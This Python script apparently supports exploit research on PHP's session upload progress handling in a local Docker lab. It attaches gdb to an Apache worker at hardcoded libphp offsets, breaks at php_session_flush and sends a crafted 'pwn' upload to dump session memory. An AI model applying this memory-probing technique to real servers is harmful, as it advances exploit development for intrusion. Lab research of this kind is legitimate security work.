import os
import subprocess, sys, time, os

BASE = os.path.dirname(os.path.abspath(__file__))
c = "p2s8335"

def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

sh(f'docker exec {c} sh -c "echo hello > /tmp/t.txt"')

r = sh(f'docker exec {c} sh -c "ps -eo pid,comm | grep apache2 | grep -v grep"')
pids = [l.split()[0] for l in r.stdout.strip().splitlines() if l.strip()]
worker_pid = pids[-1]
r = sh(f'docker exec {c} sh -c "grep libphp /proc/{worker_pid}/maps 2>/dev/null | head -1"')
B = int(r.stdout.strip().split("-")[0], 16)
print(f"[*] worker={worker_pid} base={hex(B)}", flush=True)

ps_hsv = B + 0x10432a0 + 0x140          # PS(http_session_vars) zval
flush  = B + 0x3576c0                    # php_session_flush

gdb_script = (
    "set pagination off\nset confirm off\nset width 0\n"
    f"break *{hex(flush)}\n"
    "commands\n"
    "silent\n"
    "echo [HIT] php_session_flush\\n"
    "echo === PS(http_session_vars) zval (value, type_info) ===\\n"
    f"x/2gx {hex(ps_hsv)}\n"
    "echo === session_status (ps_globals+0x68) ===\\n"
    f"x/1wx {hex(B + 0x10432a0 + 0x68)}\n"
    "detach\n"
    "end\n"
    "continue\n"
)
gl = os.path.join(BASE, "capture_R2.gdb")
with open(gl, "w") as f:
    f.write(gdb_script)
sh(f'docker cp "{gl}" {c}:/tmp/capture_R2.gdb')

gdb_proc = subprocess.Popen(
    f'docker exec {c} sh -c "gdb -batch -p {worker_pid} -x /tmp/capture_R2.gdb > /tmp/capture_R2.out 2>&1"',
    shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
)
time.sleep(4)
print("[*] sending multipart file upload...", flush=True)
r = sh(f'docker exec {c} sh -c "curl -s -o /dev/null -w \'HTTP %{{http_code}}\\n\' -F \'PHPSESSID=abc123\' -F \'PHP_SESSION_UPLOAD_PROGRESS=pwn\' -F \'file=@/tmp/t.txt\' http://127.0.0.1/index.php"')
print(r.stdout, flush=True)
time.sleep(3)
sh(f'docker exec {c} sh -c "pkill -INT gdb 2>/dev/null"')
time.sleep(1)
sh(f'docker exec {c} sh -c "pkill -9 gdb 2>/dev/null"')
try:
    gdb_proc.wait(timeout=8)
except subprocess.TimeoutExpired:
    gdb_proc.kill()

r = sh(f'docker exec {c} cat /tmp/capture_R2.out 2>/dev/null')
print("\n=== R capture ===", flush=True)
print(r.stdout, flush=True)
